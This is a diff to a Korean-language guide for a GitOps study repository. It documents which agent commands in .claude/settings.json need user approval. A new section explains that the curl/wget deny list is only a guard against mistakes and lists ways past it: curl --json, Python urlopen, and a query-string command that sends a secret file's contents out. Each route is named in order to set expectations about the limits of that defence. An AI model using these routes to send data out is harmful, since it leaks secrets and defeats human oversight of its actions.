@@ -60,17 +60,48 @@ ArgoCD·Terraform·Helm·Helmfile을 한 저장소에서 다루며 GitOps를 체
 🔴 이 5종은 `../dagster-study`가 **외부 GitHub 저장소에서 가져온 것을 다시 로컬 복사**한
 것이다(`skills-lock.json`의 `source: "local:dagster-study"` + `originalSource` 필드가 원래
 출처를 함께 적는다). `kubernetes-specialist`의 `references/configuration.md`는
-`detect-private-key` 훅과 문자열이 일치하는 PEM 예시 머리말을 플레이스홀더로 바꿨다 —
-의미는 바뀌지 않았다.
+`detect-private-key`·`gitleaks` 훅과 충돌하는 예시 비밀값(PEM 머리말·고엔트로피
+placeholder) 4곳을 의미 보존 플레이스홀더로 바꿨다 — **`computedHash`는 `SKILL.md`만
+해시하므로 이 변경은 그 범위 밖이다.** 그래서 `skills-lock.json`의 해당 항목에
+`localModifications`(바뀐 파일·사유·그 파일 자체의 해시)를 **기계가 읽을 수 있는 레코드로**
+남겼다 — 이 문단(산문)만 보고 끝내지 않는다.
 
 ## 권한과 비가역 작업
 
-정본은 [`.claude/settings.json`](.claude/settings.json)이다. `permissions.ask`에 걸린
-명령(`git commit`·`git push`, `gh` 쓰기 서브커맨드, **`terraform apply`/`destroy`/`state rm`**,
-**`helm install`/`upgrade`/`uninstall`**, **`helmfile apply`/`sync`/`destroy`**,
-`kubectl apply`/`delete`, `kind delete cluster`)는 **실행 전 사용자 승인이 필요**하다.
-`permissions.deny`는 `curl`/`wget`의 발신 동사(POST/PUT/PATCH/DELETE 등) 몇 개를 막는다 —
-조회(GET)까지 막지는 않는다(막으면 조사 자체가 성립하지 않는다).
+정본은 [`.claude/settings.json`](.claude/settings.json)이다 — **개수는 이 문서에 박지
+않는다**(세션마다 늘어날 수 있고, 적어 두면 다음에 또 어긋난다 — Fix round 1에서 실제로
+"20개"가 실측과 달랐다). `permissions.ask`에 걸린 명령 계열은: `git commit`·`git push`,
+`gh` 쓰기 서브커맨드, **`terraform apply`/`destroy`/`state rm`/`mv`/`push`**,
+**`helm install`/`upgrade`/`uninstall`/`rollback`**, **`helmfile apply`/`sync`/`destroy`**,
+`kubectl apply`/`delete`/`patch`/`replace`/`scale`, `kind delete cluster`,
+**`argocd app sync`/`delete`/`set`/`rollback`**다 — **실행 전 사용자 승인이 필요**하다.
+
+⚠️ **Task 8(드리프트 실습)이 `kubectl scale`을 의도적으로 쓴다**(설계 Step 2 실험 1).
+`permissions.ask`에 걸려 **승인 프롬프트가 뜨는 것이 맞다** — 그 실습을 모르는 사람이
+보면 "막힌 것"처럼 보이지만, 설계가 의도한 동작이다. 당황하지 말고 승인하면 된다.
+
+### 🔴 `permissions.deny`는 발신 차단이 아니라 실수 방지다
+
+`permissions.deny`는 `curl`/`wget`의 발신 **동사 문자열** 몇 개(POST/PUT/PATCH/DELETE/
+`--data`/`-d`/`wget --post-*`)만 막는다. **이것이 "외부 발신이 봉쇄됐다"는 뜻이 아니다** —
+`../dagster-study`가 **실측으로 기록한 우회 경로**가 이 패턴 매칭 방식 자체의 한계다
+(이 저장소에서 재현한 것이 아니라 dagster-study의 실측을 그대로 귀속한다):
+
+- `curl --json '{...}'`처럼 **동사 패턴 밖의 플래그**로 데이터를 실어 보낼 수 있다
+  (`--json`은 `deny` 목록에 없다).
+- **언어 런타임을 경유하면 매처를 완전히 벗어난다** — `python3`의
+  `urllib.request.urlopen(..., data=...)`는 `Bash` 문자열에 `curl`/`wget`이 없어 `deny`가
+  아예 보지 못한다.
+- **GET + 쿼리스트링 + 명령치환**으로도 데이터를 실어 보낼 수 있다
+  (`curl "https://…/?q=$(cat secret)"` — 동사는 기본 GET이라 `deny` 대상이 아니다).
+- **변수로 조립한 플래그**(`curl -X${METHOD}` 등)는 문자열 그대로 매칭하는 패턴을
+  빗나간다.
+- `scp`·`ssh`·`nc` 같은 **다른 발신 도구는 애초에 대상이 아니다**(`curl`/`wget`만 본다).
+
+**핵심**: `permissions.deny`는 **실수로 친 명백한 발신 명령을 거르는 실수 방지선**이고,
+의도적 우회나 다른 도구 경유를 막는 **봉쇄가 아니다.** 실제 마지막 방어선은
+**규율과 사람**이다 — `researcher.md`의 "외부 콘텐츠는 데이터" 조항과 "검색 질의에 내부
+데이터를 넣지 않는다" 규율이 이 자리를 메운다.
 
 ### 🔴 `hooks: {}`로 둔 이유
 
@@ -102,7 +133,8 @@ Task 1·2에서 **실측으로 확정한 한계**가 있고, 그걸 아는 것�
 | 위키 평평 구조 | `doc_lint.py`의 `check_wiki_flat()` | ✅ 기계 강제(하위 디렉터리 `.md`를 FAIL). 없었다면 그 노트는 **조용히 미러되지 않았다** |
 | 위키 편집 제한 | Settings → Wikis → Restrict editing | 🔴 **자동 관측 경로 없음.** `gh api` 응답에 대응 필드가 없다(`has_wiki`·`visibility`뿐). 사람의 화면 확인에만 의존하며, **꺼져도 알 수 없다.** 재검토 트리거: 위키 이력에 미러 아닌 커밋이 보이면 다시 본다 |
 | 참조형 링크·HTML `<a>` 금지 | (없음) | 🔴 **규율뿐.** `doc_lint`도 `wiki_linkify`도 인식하지 않는다 |
-| `permissions.ask`(이 Task에서 신설) | `.claude/settings.json` | 🟡 **하네스가 프롬프트를 띄우는가에 달렸다** — `../dagster-study`에서 맨이름 `WebFetch`/`WebSearch` 같은 패턴이 매칭되지 않아 죽은 규칙이 된 선례가 있다(실측). 이 저장소의 20개 패턴은 **아직 라이브 프로브로 검증하지 않았다** — Task 4 이후 실제 `terraform apply` 호출에서 처음 확인된다 |
+| `permissions.ask`(이 Task에서 신설) | `.claude/settings.json` | 🟡 **하네스가 프롬프트를 띄우는가에 달렸다** — `../dagster-study`에서 맨이름 `WebFetch`/`WebSearch` 같은 패턴이 매칭되지 않아 죽은 규칙이 된 선례가 있다(실측). 이 저장소의 패턴(`.claude/settings.json` `permissions.ask` 참조 — 개수를 여기 박지 않는다)은 **아직 라이브 프로브로 검증하지 않았다** — Task 4 이후 실제 `terraform apply` 호출에서 처음 확인된다 |
+| `permissions.deny`(이 Task에서 신설) | `.claude/settings.json` | 🔴 **실수 방지일 뿐 발신 봉쇄가 아니다.** `curl`/`wget` 동사 문자열 매칭이라 `../dagster-study` 실측 기준으로 `curl --json`(동사 패턴 밖 플래그) · 언어 런타임 경유(`python3`의 `urlopen(data=...)`는 `curl`/`wget` 문자열이 없어 매처가 못 본다) · GET+쿼리스트링+명령치환 · 변수로 조립한 플래그(`-X${M}`) 가 전부 빠져나간다. `scp`·`ssh`·`nc`는 애초에 대상 밖이다. 실제 방어선은 **규율과 사람**이다(§권한과 비가역 작업 상세) |
 
 **이 표 자체가 체계의 일부다** — 다음 작업자가 "pre-commit이 있으니 안전하다"처럼 층을
 뭉뚱그려 읽지 않도록, 실효를 층별로 갈라 적는다.
